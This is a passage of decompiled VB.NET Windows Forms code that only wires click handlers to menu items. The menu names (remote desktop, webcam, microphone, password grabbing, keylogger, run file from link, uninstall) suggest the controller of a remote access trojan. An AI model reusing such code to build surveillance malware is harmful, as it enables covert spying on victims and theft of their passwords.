					AddHandler toolStripStatusLabel.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000116 RID: 278
		' (get) Token: 0x0600037B RID: 891 RVA: 0x00028CB7 File Offset: 0x00026EB7
		' (set) Token: 0x0600037C RID: 892 RVA: 0x00028CC4 File Offset: 0x00026EC4
		Friend Overridable Property ToolStripStatusLabel4 As ToolStripStatusLabel
			<CompilerGenerated()>
			Get
				Return Me._ToolStripStatusLabel4
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.ToolStripStatusLabel4_Click
				Dim toolStripStatusLabel As ToolStripStatusLabel = Me._ToolStripStatusLabel4
				If toolStripStatusLabel IsNot Nothing Then
					RemoveHandler toolStripStatusLabel.Click, value2
				End If
				Me._ToolStripStatusLabel4 = value
				toolStripStatusLabel = Me._ToolStripStatusLabel4
				If toolStripStatusLabel IsNot Nothing Then
					AddHandler toolStripStatusLabel.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000117 RID: 279
		' (get) Token: 0x0600037D RID: 893 RVA: 0x00028D07 File Offset: 0x00026F07
		' (set) Token: 0x0600037E RID: 894 RVA: 0x00028D11 File Offset: 0x00026F11
		Friend Overridable Property conz As ToolStripStatusLabel

		' Token: 0x17000118 RID: 280
		' (get) Token: 0x0600037F RID: 895 RVA: 0x00028D1A File Offset: 0x00026F1A
		' (set) Token: 0x06000380 RID: 896 RVA: 0x00028D24 File Offset: 0x00026F24
		Friend Overridable Property upl As ToolStripStatusLabel

		' Token: 0x17000119 RID: 281
		' (get) Token: 0x06000381 RID: 897 RVA: 0x00028D2D File Offset: 0x00026F2D
		' (set) Token: 0x06000382 RID: 898 RVA: 0x00028D37 File Offset: 0x00026F37
		Friend Overridable Property dwn As ToolStripStatusLabel

		' Token: 0x1700011A RID: 282
		' (get) Token: 0x06000383 RID: 899 RVA: 0x00028D40 File Offset: 0x00026F40
		' (set) Token: 0x06000384 RID: 900 RVA: 0x00028D4A File Offset: 0x00026F4A
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x1700011B RID: 283
		' (get) Token: 0x06000385 RID: 901 RVA: 0x00028D53 File Offset: 0x00026F53
		' (set) Token: 0x06000386 RID: 902 RVA: 0x00028D60 File Offset: 0x00026F60
		Friend Overridable Property ManagerToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ManagerToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ManagerToolStripMenuItem_Click
				Dim managerToolStripMenuItem As ToolStripMenuItem = Me._ManagerToolStripMenuItem
				If managerToolStripMenuItem IsNot Nothing Then
					RemoveHandler managerToolStripMenuItem.Click, value2
				End If
				Me._ManagerToolStripMenuItem = value
				managerToolStripMenuItem = Me._ManagerToolStripMenuItem
				If managerToolStripMenuItem IsNot Nothing Then
					AddHandler managerToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700011C RID: 284
		' (get) Token: 0x06000387 RID: 903 RVA: 0x00028DA3 File Offset: 0x00026FA3
		' (set) Token: 0x06000388 RID: 904 RVA: 0x00028DAD File Offset: 0x00026FAD
		Friend Overridable Property RunFileToolStripMenuItem As ToolStripMenuItem

		' Token: 0x1700011D RID: 285
		' (get) Token: 0x06000389 RID: 905 RVA: 0x00028DB6 File Offset: 0x00026FB6
		' (set) Token: 0x0600038A RID: 906 RVA: 0x00028DC0 File Offset: 0x00026FC0
		Friend Overridable Property FromLinkToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._FromLinkToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FromLinkToolStripMenuItem_Click
				Dim fromLinkToolStripMenuItem As ToolStripMenuItem = Me._FromLinkToolStripMenuItem
				If fromLinkToolStripMenuItem IsNot Nothing Then
					RemoveHandler fromLinkToolStripMenuItem.Click, value2
				End If
				Me._FromLinkToolStripMenuItem = value
				fromLinkToolStripMenuItem = Me._FromLinkToolStripMenuItem
				If fromLinkToolStripMenuItem IsNot Nothing Then
					AddHandler fromLinkToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700011E RID: 286
		' (get) Token: 0x0600038B RID: 907 RVA: 0x00028E03 File Offset: 0x00027003
		' (set) Token: 0x0600038C RID: 908 RVA: 0x00028E10 File Offset: 0x00027010
		Friend Overridable Property FromDiskToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._FromDiskToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FromDiskToolStripMenuItem_Click
				Dim fromDiskToolStripMenuItem As ToolStripMenuItem = Me._FromDiskToolStripMenuItem
				If fromDiskToolStripMenuItem IsNot Nothing Then
					RemoveHandler fromDiskToolStripMenuItem.Click, value2
				End If
				Me._FromDiskToolStripMenuItem = value
				fromDiskToolStripMenuItem = Me._FromDiskToolStripMenuItem
				If fromDiskToolStripMenuItem IsNot Nothing Then
					AddHandler fromDiskToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700011F RID: 287
		' (get) Token: 0x0600038D RID: 909 RVA: 0x00028E53 File Offset: 0x00027053
		' (set) Token: 0x0600038E RID: 910 RVA: 0x00028E60 File Offset: 0x00027060
		Friend Overridable Property ScriptToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ScriptToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ScriptToolStripMenuItem_Click
				Dim scriptToolStripMenuItem As ToolStripMenuItem = Me._ScriptToolStripMenuItem
				If scriptToolStripMenuItem IsNot Nothing Then
					RemoveHandler scriptToolStripMenuItem.Click, value2
				End If
				Me._ScriptToolStripMenuItem = value
				scriptToolStripMenuItem = Me._ScriptToolStripMenuItem
				If scriptToolStripMenuItem IsNot Nothing Then
					AddHandler scriptToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000120 RID: 288
		' (get) Token: 0x0600038F RID: 911 RVA: 0x00028EA3 File Offset: 0x000270A3
		' (set) Token: 0x06000390 RID: 912 RVA: 0x00028EB0 File Offset: 0x000270B0
		Friend Overridable Property RemoteDesktopToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RemoteDesktopToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RemoteDesktopToolStripMenuItem_Click
				Dim remoteDesktopToolStripMenuItem As ToolStripMenuItem = Me._RemoteDesktopToolStripMenuItem
				If remoteDesktopToolStripMenuItem IsNot Nothing Then
					RemoveHandler remoteDesktopToolStripMenuItem.Click, value2
				End If
				Me._RemoteDesktopToolStripMenuItem = value
				remoteDesktopToolStripMenuItem = Me._RemoteDesktopToolStripMenuItem
				If remoteDesktopToolStripMenuItem IsNot Nothing Then
					AddHandler remoteDesktopToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000121 RID: 289
		' (get) Token: 0x06000391 RID: 913 RVA: 0x00028EF3 File Offset: 0x000270F3
		' (set) Token: 0x06000392 RID: 914 RVA: 0x00028F00 File Offset: 0x00027100
		Friend Overridable Property RemoteCamToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RemoteCamToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RemoteCamToolStripMenuItem_Click
				Dim remoteCamToolStripMenuItem As ToolStripMenuItem = Me._RemoteCamToolStripMenuItem
				If remoteCamToolStripMenuItem IsNot Nothing Then
					RemoveHandler remoteCamToolStripMenuItem.Click, value2
				End If
				Me._RemoteCamToolStripMenuItem = value
				remoteCamToolStripMenuItem = Me._RemoteCamToolStripMenuItem
				If remoteCamToolStripMenuItem IsNot Nothing Then
					AddHandler remoteCamToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000122 RID: 290
		' (get) Token: 0x06000393 RID: 915 RVA: 0x00028F43 File Offset: 0x00027143
		' (set) Token: 0x06000394 RID: 916 RVA: 0x00028F50 File Offset: 0x00027150
		Friend Overridable Property MicrophoneToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._MicrophoneToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.MicrophoneToolStripMenuItem_Click
				Dim microphoneToolStripMenuItem As ToolStripMenuItem = Me._MicrophoneToolStripMenuItem
				If microphoneToolStripMenuItem IsNot Nothing Then
					RemoveHandler microphoneToolStripMenuItem.Click, value2
				End If
				Me._MicrophoneToolStripMenuItem = value
				microphoneToolStripMenuItem = Me._MicrophoneToolStripMenuItem
				If microphoneToolStripMenuItem IsNot Nothing Then
					AddHandler microphoneToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000123 RID: 291
		' (get) Token: 0x06000395 RID: 917 RVA: 0x00028F93 File Offset: 0x00027193
		' (set) Token: 0x06000396 RID: 918 RVA: 0x00028FA0 File Offset: 0x000271A0
		Friend Overridable Property GetPasswordsToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._GetPasswordsToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.GetPasswordsToolStripMenuItem_Click
				Dim getPasswordsToolStripMenuItem As ToolStripMenuItem = Me._GetPasswordsToolStripMenuItem
				If getPasswordsToolStripMenuItem IsNot Nothing Then
					RemoveHandler getPasswordsToolStripMenuItem.Click, value2
				End If
				Me._GetPasswordsToolStripMenuItem = value
				getPasswordsToolStripMenuItem = Me._GetPasswordsToolStripMenuItem
				If getPasswordsToolStripMenuItem IsNot Nothing Then
					AddHandler getPasswordsToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000124 RID: 292
		' (get) Token: 0x06000397 RID: 919 RVA: 0x00028FE3 File Offset: 0x000271E3
		' (set) Token: 0x06000398 RID: 920 RVA: 0x00028FF0 File Offset: 0x000271F0
		Friend Overridable Property KeyloggerToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._KeyloggerToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KeyloggerToolStripMenuItem_Click
				Dim keyloggerToolStripMenuItem As ToolStripMenuItem = Me._KeyloggerToolStripMenuItem
				If keyloggerToolStripMenuItem IsNot Nothing Then
					RemoveHandler keyloggerToolStripMenuItem.Click, value2
				End If
				Me._KeyloggerToolStripMenuItem = value
				keyloggerToolStripMenuItem = Me._KeyloggerToolStripMenuItem
				If keyloggerToolStripMenuItem IsNot Nothing Then
					AddHandler keyloggerToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000125 RID: 293
		' (get) Token: 0x06000399 RID: 921 RVA: 0x00029033 File Offset: 0x00027233
		' (set) Token: 0x0600039A RID: 922 RVA: 0x00029040 File Offset: 0x00027240
		Friend Overridable Property OpenChatToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._OpenChatToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OpenChatToolStripMenuItem_Click
				Dim openChatToolStripMenuItem As ToolStripMenuItem = Me._OpenChatToolStripMenuItem
				If openChatToolStripMenuItem IsNot Nothing Then
					RemoveHandler openChatToolStripMenuItem.Click, value2
				End If
				Me._OpenChatToolStripMenuItem = value
				openChatToolStripMenuItem = Me._OpenChatToolStripMenuItem
				If openChatToolStripMenuItem IsNot Nothing Then
					AddHandler openChatToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000126 RID: 294
		' (get) Token: 0x0600039B RID: 923 RVA: 0x00029083 File Offset: 0x00027283
		' (set) Token: 0x0600039C RID: 924 RVA: 0x0002908D File Offset: 0x0002728D
		Friend Overridable Property ServerToolStripMenuItem As ToolStripMenuItem

		' Token: 0x17000127 RID: 295
		' (get) Token: 0x0600039D RID: 925 RVA: 0x00029096 File Offset: 0x00027296
		' (set) Token: 0x0600039E RID: 926 RVA: 0x000290A0 File Offset: 0x000272A0
		Friend Overridable Property UpdateToolStripMenuItem As ToolStripMenuItem

		' Token: 0x17000128 RID: 296
		' (get) Token: 0x0600039F RID: 927 RVA: 0x000290A9 File Offset: 0x000272A9
		' (set) Token: 0x060003A0 RID: 928 RVA: 0x000290B4 File Offset: 0x000272B4
		Friend Overridable Property FromDISKToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._FromDISKToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FromDISKToolStripMenuItem1_Click
				Dim fromDISKToolStripMenuItem As ToolStripMenuItem = Me._FromDISKToolStripMenuItem1
				If fromDISKToolStripMenuItem IsNot Nothing Then
					RemoveHandler fromDISKToolStripMenuItem.Click, value2
				End If
				Me._FromDISKToolStripMenuItem1 = value
				fromDISKToolStripMenuItem = Me._FromDISKToolStripMenuItem1
				If fromDISKToolStripMenuItem IsNot Nothing Then
					AddHandler fromDISKToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000129 RID: 297
		' (get) Token: 0x060003A1 RID: 929 RVA: 0x000290F7 File Offset: 0x000272F7
		' (set) Token: 0x060003A2 RID: 930 RVA: 0x00029104 File Offset: 0x00027304
		Friend Overridable Property FromLINKToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._FromLINKToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FromLINKToolStripMenuItem1_Click
				Dim fromLINKToolStripMenuItem As ToolStripMenuItem = Me._FromLINKToolStripMenuItem1
				If fromLINKToolStripMenuItem IsNot Nothing Then
					RemoveHandler fromLINKToolStripMenuItem.Click, value2
				End If
				Me._FromLINKToolStripMenuItem1 = value
				fromLINKToolStripMenuItem = Me._FromLINKToolStripMenuItem1
				If fromLINKToolStripMenuItem IsNot Nothing Then
					AddHandler fromLINKToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700012A RID: 298
		' (get) Token: 0x060003A3 RID: 931 RVA: 0x00029147 File Offset: 0x00027347
		' (set) Token: 0x060003A4 RID: 932 RVA: 0x00029154 File Offset: 0x00027354
		Friend Overridable Property UninstallToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._UninstallToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UninstallToolStripMenuItem_Click
				Dim uninstallToolStripMenuItem As ToolStripMenuItem = Me._UninstallToolStripMenuItem
				If uninstallToolStripMenuItem IsNot Nothing Then
					RemoveHandler uninstallToolStripMenuItem.Click, value2
				End If
				Me._UninstallToolStripMenuItem = value
				uninstallToolStripMenuItem = Me._UninstallToolStripMenuItem
				If uninstallToolStripMenuItem IsNot Nothing Then
					AddHandler uninstallToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700012B RID: 299
		' (get) Token: 0x060003A5 RID: 933 RVA: 0x00029197 File Offset: 0x00027397
		' (set) Token: 0x060003A6 RID: 934 RVA: 0x000291A4 File Offset: 0x000273A4
		Friend Overridable Property RestartToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RestartToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RestartToolStripMenuItem_Click
				Dim restartToolStripMenuItem As ToolStripMenuItem = Me._RestartToolStripMenuItem
				If restartToolStripMenuItem IsNot Nothing Then
					RemoveHandler restartToolStripMenuItem.Click, value2
				End If
				Me._RestartToolStripMenuItem = value
				restartToolStripMenuItem = Me._RestartToolStripMenuItem
				If restartToolStripMenuItem IsNot Nothing Then
					AddHandler restartToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700012C RID: 300
		' (get) Token: 0x060003A7 RID: 935 RVA: 0x000291E7 File Offset: 0x000273E7
		' (set) Token: 0x060003A8 RID: 936 RVA: 0x000291F4 File Offset: 0x000273F4
		Friend Overridable Property CloseToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CloseToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CloseToolStripMenuItem_Click
				Dim closeToolStripMenuItem As ToolStripMenuItem = Me._CloseToolStripMenuItem
				If closeToolStripMenuItem IsNot Nothing Then
					RemoveHandler closeToolStripMenuItem.Click, value2
				End If
				Me._CloseToolStripMenuItem = value
				closeToolStripMenuItem = Me._CloseToolStripMenuItem
				If closeToolStripMenuItem IsNot Nothing Then
					AddHandler closeToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700012D RID: 301
		' (get) Token: 0x060003A9 RID: 937 RVA: 0x00029237 File Offset: 0x00027437
		' (set) Token: 0x060003AA RID: 938 RVA: 0x00029244 File Offset: 0x00027444
		Friend Overridable Property DisconnectToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._DisconnectToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DisconnectToolStripMenuItem_Click
				Dim disconnectToolStripMenuItem As ToolStripMenuItem = Me._DisconnectToolStripMenuItem
				If disconnectToolStripMenuItem IsNot Nothing Then
					RemoveHandler disconnectToolStripMenuItem.Click, value2
				End If
				Me._DisconnectToolStripMenuItem = value
				disconnectToolStripMenuItem = Me._DisconnectToolStripMenuItem
				If disconnectToolStripMenuItem IsNot Nothing Then
					AddHandler disconnectToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700012E RID: 302
		' (get) Token: 0x060003AB RID: 939 RVA: 0x00029287 File Offset: 0x00027487
		' (set) Token: 0x060003AC RID: 940 RVA: 0x00029294 File Offset: 0x00027494
		Friend Overridable Property RenameToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RenameToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RenameToolStripMenuItem_Click
				Dim renameToolStripMenuItem As ToolStripMenuItem = Me._RenameToolStripMenuItem
				If renameToolStripMenuItem IsNot Nothing Then
					RemoveHandler renameToolStripMenuItem.Click, value2
				End If
				Me._RenameToolStripMenuItem = value
				renameToolStripMenuItem = Me._RenameToolStripMenuItem
				If renameToolStripMenuItem IsNot Nothing Then
					AddHandler renameToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700012F RID: 303
		' (get) Token: 0x060003AD RID: 941 RVA: 0x000292D7 File Offset: 0x000274D7
		' (set) Token: 0x060003AE RID: 942 RVA: 0x000292E4 File Offset: 0x000274E4
		Friend Overridable Property OpenFolderToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._OpenFolderToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OpenFolderToolStripMenuItem_Click
				Dim openFolderToolStripMenuItem As ToolStripMenuItem = Me._OpenFolderToolStripMenuItem
				If openFolderToolStripMenuItem IsNot Nothing Then
					RemoveHandler openFolderToolStripMenuItem.Click, value2
				End If
				Me._OpenFolderToolStripMenuItem = value
				openFolderToolStripMenuItem = Me._OpenFolderToolStripMenuItem
				If openFolderToolStripMenuItem IsNot Nothing Then
					AddHandler openFolderToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000130 RID: 304
		' (get) Token: 0x060003AF RID: 943 RVA: 0x00029327 File Offset: 0x00027527
		' (set) Token: 0x060003B0 RID: 944 RVA: 0x00029331 File Offset: 0x00027531
		Friend Overridable Property IMG2 As ImageList

		' Token: 0x17000131 RID: 305
		' (get) Token: 0x060003B1 RID: 945 RVA: 0x0002933A File Offset: 0x0002753A
		' (set) Token: 0x060003B2 RID: 946 RVA: 0x00029344 File Offset: 0x00027544
		Friend Overridable Property NotifyIcon1 As NotifyIcon
			<CompilerGenerated()>
			Get
				Return Me._NotifyIcon1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NotifyIcon)
				Dim value2 As MouseEventHandler = AddressOf Me.NotifyIcon1_MouseDoubleClick
				Dim notifyIcon As NotifyIcon = Me._NotifyIcon1
				If notifyIcon IsNot Nothing Then
					RemoveHandler notifyIcon.MouseDoubleClick, value2
				End If
				Me._NotifyIcon1 = value
				notifyIcon = Me._NotifyIcon1
				If notifyIcon IsNot Nothing Then
					AddHandler notifyIcon.MouseDoubleClick, value2
				End If
			End Set
		End Property

		' Token: 0x17000132 RID: 306
		' (get) Token: 0x060003B3 RID: 947 RVA: 0x00029387 File Offset: 0x00027587
		' (set) Token: 0x060003B4 RID: 948 RVA: 0x00029394 File Offset: 0x00027594
		Friend Overridable Property L1 As L1
			<CompilerGenerated()>
			Get
				Return Me._L1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As L1)
				Dim value2 As DataGridViewColumnEventHandler = AddressOf Me.L1_ColumnWidthChanged
				Dim l As L1 = Me._L1
				If l IsNot Nothing Then
					RemoveHandler l.ColumnWidthChanged, value2
				End If
				Me._L1 = value
				l = Me._L1
				If l IsNot Nothing Then
					AddHandler l.ColumnWidthChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000133 RID: 307
		' (get) Token: 0x060003B5 RID: 949 RVA: 0x000293D7 File Offset: 0x000275D7
		' (set) Token: 0x060003B6 RID: 950 RVA: 0x000293E1 File Offset: 0x000275E1
		Friend Overridable Property Pp1 As Pp1

		' Token: 0x17000134 RID: 308
		' (get) Token: 0x060003B7 RID: 951 RVA: 0x000293EA File Offset: 0x000275EA
		' (set) Token: 0x060003B8 RID: 952 RVA: 0x000293F4 File Offset: 0x000275F4
		Friend Overridable Property ContextMenuStrip2 As ContextMenuStrip

		' Token: 0x17000135 RID: 309
		' (get) Token: 0x060003B9 RID: 953 RVA: 0x000293FD File Offset: 0x000275FD
		' (set) Token: 0x060003BA RID: 954 RVA: 0x00029408 File Offset: 0x00027608
		Friend Overridable Property ShowToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ShowToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ShowToolStripMenuItem_Click
				Dim showToolStripMenuItem As ToolStripMenuItem = Me._ShowToolStripMenuItem
				If showToolStripMenuItem IsNot Nothing Then
					RemoveHandler showToolStripMenuItem.Click, value2
				End If
				Me._ShowToolStripMenuItem = value
				showToolStripMenuItem = Me._ShowToolStripMenuItem
				If showToolStripMenuItem IsNot Nothing Then
					AddHandler showToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000136 RID: 310
		' (get) Token: 0x060003BB RID: 955 RVA: 0x0002944B File Offset: 0x0002764B
		' (set) Token: 0x060003BC RID: 956 RVA: 0x00029458 File Offset: 0x00027658
		Friend Overridable Property RestartToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RestartToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RestartToolStripMenuItem1_Click
				Dim restartToolStripMenuItem As ToolStripMenuItem = Me._RestartToolStripMenuItem1
				If restartToolStripMenuItem IsNot Nothing Then
					RemoveHandler restartToolStripMenuItem.Click, value2
				End If
				Me._RestartToolStripMenuItem1 = value
				restartToolStripMenuItem = Me._RestartToolStripMenuItem1
				If restartToolStripMenuItem IsNot Nothing Then
					AddHandler restartToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000137 RID: 311
		' (get) Token: 0x060003BD RID: 957 RVA: 0x0002949B File Offset: 0x0002769B
		' (set) Token: 0x060003BE RID: 958 RVA: 0x000294A8 File Offset: 0x000276A8
		Friend Overridable Property ExitToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ExitToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ExitToolStripMenuItem_Click
				Dim exitToolStripMenuItem As ToolStripMenuItem = Me._ExitToolStripMenuItem
				If exitToolStripMenuItem IsNot Nothing Then
					RemoveHandler exitToolStripMenuItem.Click, value2
				End If
				Me._ExitToolStripMenuItem = value
				exitToolStripMenuItem = Me._ExitToolStripMenuItem
				If exitToolStripMenuItem IsNot Nothing Then
					AddHandler exitToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000138 RID: 312
		' (get) Token: 0x060003BF RID: 959 RVA: 0x000294EB File Offset: 0x000276EB
		' (set) Token: 0x060003C0 RID: 960 RVA: 0x000294F8 File Offset: 0x000276F8
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000139 RID: 313
		' (get) Token: 0x060003C1 RID: 961 RVA: 0x0002953B File Offset: 0x0002773B
		' (set) Token: 0x060003C2 RID: 962 RVA: 0x00029548 File Offset: 0x00027748
		Friend Overridable Property ToolStripStatusLabel2 As ToolStripStatusLabel
			<CompilerGenerated()>
			Get
				Return Me._ToolStripStatusLabel2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.ToolStripStatusLabel2_Click
				Dim toolStripStatusLabel As ToolStripStatusLabel = Me._ToolStripStatusLabel2
				If toolStripStatusLabel IsNot Nothing Then
					RemoveHandler toolStripStatusLabel.Click, value2
				End If
				Me._ToolStripStatusLabel2 = value
				toolStripStatusLabel = Me._ToolStripStatusLabel2
				If toolStripStatusLabel IsNot Nothing Then
					AddHandler toolStripStatusLabel.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700013A RID: 314
		' (get) Token: 0x060003C3 RID: 963 RVA: 0x0002958B File Offset: 0x0002778B
		' (set) Token: 0x060003C4 RID: 964 RVA: 0x00029595 File Offset: 0x00027795
		Friend Overridable Property ToolStripStatusLabel6 As ToolStripStatusLabel

		' Token: 0x1700013B RID: 315
		' (get) Token: 0x060003C5 RID: 965 RVA: 0x0002959E File Offset: 0x0002779E
		' (set) Token: 0x060003C6 RID: 966 RVA: 0x000295A8 File Offset: 0x000277A8
		Friend Overridable Property ToolStripStatusLabel7 As ToolStripStatusLabel

		' Token: 0x1700013C RID: 316
		' (get) Token: 0x060003C7 RID: 967 RVA: 0x000295B1 File Offset: 0x000277B1
		' (set) Token: 0x060003C8 RID: 968 RVA: 0x000295BC File Offset: 0x000277BC
		Friend Overridable Property ToolStripStatusLabel8 As ToolStripStatusLabel
			<CompilerGenerated()>
			Get
				Return Me._ToolStripStatusLabel8
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.ToolStripStatusLabel8_Click
				Dim toolStripStatusLabel As ToolStripStatusLabel = Me._ToolStripStatusLabel8
				If toolStripStatusLabel IsNot Nothing Then
					RemoveHandler toolStripStatusLabel.Click, value2
				End If
				Me._ToolStripStatusLabel8 = value
